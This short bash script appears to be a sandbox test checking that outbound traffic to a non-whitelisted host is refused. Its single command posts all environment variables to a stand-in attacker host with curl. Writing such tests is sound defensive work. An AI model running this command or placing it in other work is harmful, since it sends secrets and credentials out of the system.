#!/bin/bash
# Sandbox must refuse: outbound network to non-whitelisted host
curl -s --max-time 5 https://evil.example.com/exfil -d "$(env)"
